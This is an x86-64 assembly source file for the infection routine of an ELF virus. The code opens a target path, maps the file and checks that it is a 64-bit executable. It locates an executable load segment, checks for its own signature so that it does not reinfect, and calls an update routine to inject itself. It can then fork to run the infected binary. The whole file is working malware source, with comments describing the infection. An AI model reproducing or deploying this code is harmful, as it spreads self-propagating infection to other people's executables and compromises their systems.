section .text
	global _treat_file
	global _final_end
	extern _update_mmaped_file
	extern _string
	extern _ft_strlen
	extern _thread_create

_file_size:
	enter 24, 0
; lseek to start of file
	xor rax, rax
	mov rax, 8
	mov rsi, 0
	mov rdx, 0
	syscall
; lseek to end of file
	mov rax, 8
	mov rsi, 0
	mov rdx, 2
	syscall
; store the return value, it's the offset of EOF. So it's the file size
; lseek to start of file again
	mov QWORD [rsp], rax
	mov rax, 8
	mov rsi, 0
	mov rdx, 0
	syscall
	mov rax, QWORD [rsp]
	leave
	ret

_treat_file: ; void treat_file(char *name (rdi), long virus_size (rsi), char *full_path (rdx), bool fork (r10))
	enter 136, 0 ; equal to push rbp - mov rbp, rsp - sub rsp, 16
	; rsp + 0 bytes for fd
	; rsp + 8 bytes for virus size
	; rsp + 16 bytes for file size
	; rsp + 24 bytes for mmap return address
	; rsp + 32 phdr
	; rsp + 40 actual phnum
	; rsp + 48 ehdr->e_phnum
	; rsp + 56 supposed string of file
	; rsp + 64 name addr
	; rsp + 72 full_path addr
	; rsp + 80 name len
	; rsp + 88 full_path len
	; rsp + 96 total len
	; rsp + 104 end jmp addr
	; rsp + 112 bool, fork or not
; check if name != NULL
	cmp rdi, 0
	je _not_ok_end
; save parameters
	mov QWORD [rsp + 112], r10 ; fork bool
	mov QWORD [rsp + 8], rsi ; virus_size
	mov QWORD [rsp + 64], rdi ; name
	mov QWORD [rsp + 72], rdx ; full_path

; take len of arguments
	mov rdi, QWORD [rsp + 64]
	call _ft_strlen
	mov QWORD [rsp + 80], rax
	mov rdi, QWORD [rsp + 72]
	call _ft_strlen
	mov QWORD [rsp + 88], rax

; calcul total len
	mov r10, rsp
	add r10, 96 ; total len addr on stack
	mov r11, QWORD [rsp + 80] ; take first len
	mov QWORD [r10], r11 ; mov it to our variable
	mov r11, QWORD [rsp + 88] ; take second len
	add QWORD [r10], r11 ; add it to our variable
	add QWORD [r10], 2 ; add 2 for the / and \0
; path
	mov rdi, rsp
	sub rdi, QWORD [rsp + 96]
	mov rsi, QWORD [rsp + 72]
	mov rcx, QWORD [rsp + 88]
	cld
	rep movsb
; path + '/'
	mov rdi, rsp
	sub rdi, QWORD [rsp + 96]
	add rdi, QWORD [rsp + 88]
	mov BYTE [rdi], 0x2f
; path + '/' + file_name
	add rdi, 1
	mov rsi, QWORD [rsp + 64]
	mov rcx, QWORD [rsp + 80]
	cld
	rep movsb
	mov rdi, rsp
	sub rdi, QWORD [rsp + 96]
	add rdi, QWORD [rsp + 88]
	add rdi, 1
	add rdi, QWORD [rsp + 80]
	mov BYTE [rdi], 0
;;;;;;;;;;;;;;;;;
; open file
	mov rdi, rsp
	sub rdi, QWORD [rsp + 96]
	mov rax, 2
	mov rsi, 2
	xor rdx, rdx
		mov r10, QWORD [rsp + 96]
		sub rsp, r10
		sub rsp, 8
		mov QWORD [rsp], r10
		add QWORD [rsp], 8
	syscall
		add rsp, QWORD [rsp]
	cmp rax, -1
	jle _not_ok_end
	mov QWORD [rsp], rax ; store the fd
	mov rdi, rax
		mov r10, QWORD [rsp + 96]
		sub rsp, r10
		sub rsp, 8
		mov QWORD [rsp], r10
		add QWORD [rsp], 8
	call _file_size
		add rsp, QWORD [rsp]
	mov QWORD [rsp + 16], rax ; store file size
	lea r10, [rel _not_ok_end]
	mov QWORD [rsp + 104], r10
	cmp rax, 64
	jl _close_file

;;;;;;;;;;;;;;;;;
; mmap file
	mov rax, 9
	mov rdi, 0
	mov rsi, QWORD [rsp + 16]
	mov rdx, 3
	mov r10, 2
	mov r8, QWORD [rsp]
	mov r9, 0
	syscall
_verif_mmap:
	cmp rax, 0
	jle _close_file
	mov QWORD [rsp + 24], rax

_read_file_header_64:
;; check magic number
	mov rdi, QWORD [rsp + 24]
	cmp DWORD [rdi], 0x464c457f
	jne _munmap
;; check class file (only 64 bits are treated)
	cmp BYTE [rdi + 4], 2
	jne _munmap
;; check the file type, only exec files are treated
	cmp WORD [rdi + 16], 2
	jne _munmap
;; check if our string is already in the file.
; we just take the PT_LOAD segment +PT_LOAD size, to go at the end of this segment,
; and substract to this value, the virus size, to go to our theoric signature string address in file
; then we verify it 8 by 8 bytes with our current signature.
; here we take the phdr_offset, to browse the segment table, to find the PT_LOAD segments
	mov r10, QWORD [rsp + 24] ; take mmap_base_addr
	mov QWORD [rsp + 32], r10 ; phdr = r10
	add QWORD [rsp + 32], 32 ; add 32 to mmap_base_addr, it's the offset of ph_offset
	mov r10, QWORD [rsp + 32] ; r10 = phdr
	mov r10, QWORD [r10] ; take the value of ph_offset(it's like i = *i), where i is a long containing an address of a long value
; verif if ph_offset is not out of the file
	cmp r10, QWORD [rsp + 16]
	jge _munmap
; segment table should only be directly after header, so 64 bytes offset
	cmp r10, 64
	jne _munmap
	mov QWORD [rsp + 32], r10 ; phdr = r10, save ph_offset value
	mov r10, QWORD [rsp + 24] ; r10 = mmap addr
	add QWORD [rsp + 32], r10 ; add the ph_offset to the mmap_base_address, to work on our mmaped buffer
	mov QWORD [rsp + 40], 0 ; phnum = 0
; now we need to take the number of segments
	mov r10, QWORD [rsp + 24] ; take mmap_base_address
	mov QWORD [rsp + 48], r10 ; move it on stack
	add QWORD [rsp + 48], 56 ; add 56 to the mmap_base_address, it's the offset of e_phnum
	mov r11, QWORD [rsp + 48] ; mov this address on r11
	xor r10, r10 ; r10 = 0
	mov r10w, WORD [r11] ; now we dereference our address to access the e_phnum value, and store it on r10
	mov QWORD [rsp + 48], r10 ; save it on stack
; if e_phnum is negativ, their is a problem
	cmp r10, 0
	jl _munmap

; now we browse all the segment to find PT_LOAD
_loop_verif:
	mov r10, QWORD [rsp + 40] ; take  actual phnum
	cmp r10, QWORD [rsp + 48] ; if phnum >= ehdr->e_phnum
	jge _munmap
	mov r10, QWORD [rsp + 32] ; take phdr
; check the type and flag, we need to have type == PT_LOAD && flag = exec|read
	cmp DWORD [r10], 1 ; if *phdr != 1
	jne _inc_before_reloop
	add r10, 4 ; add 4 to the phdr address
	mov r10d, DWORD [r10] ; dereference phdr (4bytes), this is the flag
	and r10d, 1 ; r10 & 1 ; logical and
	cmp r10d, 1 ; if r10 != 1
	jne _inc_before_reloop
; we find pt_load, now we need to go to our supposed str addres:
; str_addr = (segment offset in file + segment size in file) - virus size
	mov r10, QWORD [rsp + 32] ; take phdr
	add r10, 8 ; add 8 to phdr, offset for p_offset (offset of the segment in file)
	mov r10, QWORD [r10] ; dereference it to take the value
	mov QWORD [rsp + 56], r10 ; store it in stack
	mov r10, QWORD [rsp + 32] ; take phdr
	add r10, 32 ; add 32 to phdr, offset for p_filesz (the size of the segment)
	mov r10, QWORD [r10] ; dereference it to take the value
	add QWORD [rsp + 56], r10 ; add it to the p_offset find before
	mov r10, QWORD [rsp + 8] ; take the virus size
	sub QWORD [rsp + 56], r10 ; substract the virus size to our offset+size
_cmp_offset:
	cmp QWORD [rsp + 56], 0
	jle _call_mmaped_update ; if our string addr is lower than the mmap addr, so we are out of the file, and this one cant hold our virus
; now we have the theoric offset of our string, we need to add this offset on the mmap address
	mov r10, QWORD [rsp + 24] ; take mmap address
	add QWORD [rsp + 56], r10 ; add it to our offset
	jmp _init_cmp_loop

_inc_before_reloop:
	add QWORD [rsp + 32], 56
	inc QWORD [rsp + 40]
	jmp _loop_verif

_init_cmp_loop:
; here we will compare 8 by 8 bytes of the string 
	xor rcx, rcx ; clear rcx
	mov rdi, QWORD [rsp + 56] ; take the str supposed address
	lea rsi, [rel _string] ; take our actual string address

_cmp:
	cmp rcx, 48 ; until we check 48 bytes
	jge _munmap ; if we checked 48 bytes successfully, so we find the signature, and we dont need to reinfect this file
	mov r10, QWORD [rsi + rcx] ; take 8 bytes of our actual string
	cmp r10, QWORD [rdi + rcx] ; compare it to 8 bytes of the supposed string
	jne _call_mmaped_update ; if it differ, the file haven't been infected, so we do
	add rcx, 8 ; add 8 to our index
	jmp _cmp

_call_mmaped_update:
; init argument for next function
	mov rdi, QWORD [rsp + 24] ; mmap_base_addr
	mov rsi, QWORD [rsp + 16] ; file size
	mov rdx, QWORD [rsp + 8] ; virus size
	mov r10, QWORD [rsp] ; fd
		mov r11, QWORD [rsp + 96]
		sub rsp, r11
		sub rsp, 8
		mov QWORD [rsp], r11
		add QWORD [rsp], 8
	call _update_mmaped_file
		add rsp, QWORD [rsp]
	lea rdi, [rel _ok_end]
	mov QWORD [rsp + 104], rdi
	cmp rax, 1
	je _munmap
	lea rdi, [rel _not_ok_end]
	mov QWORD [rsp + 104], rdi

;;;;;;;;;;;;;;;;;;;;;;;;
; munmap
_munmap:
	mov rax, 11
	mov rdi, QWORD [rsp + 24]
	mov rsi, QWORD [rsp + 16]
	syscall
;;;;;;;;;;;;;;;;;;;;;;;;
; close file
_close_file:
	mov rax, 3
	mov rdi, QWORD [rsp]
	syscall
	mov rax, QWORD [rsp + 104]
	jmp rax

; Here we need we successfully infected the binary, so we will check if we need to run him or not
_ok_end:
	cmp QWORD [rsp + 112], 1 ; check if fork mode is activated
	jne _not_ok_end ; if not, we return.
	mov r10, QWORD [rsp + 96] ; take total len
	mov rdi, QWORD [rsp + 64] ; take name addr
	mov rsi, QWORD [rsp + 72] ; take full path addr
	mov rdx, rsp
		sub rdx, r10 ; take full concatened path addr
		sub rsp, r10
		sub rsp, 8
		mov QWORD [rsp], r10
		add QWORD [rsp], 8
	call _thread_create ; fork to exec this infected binary
		add rsp, QWORD [rsp]
	mov rax, 1
	jmp _final_end

_not_ok_end:
	mov rax, 0

_final_end:
	leave
	ret
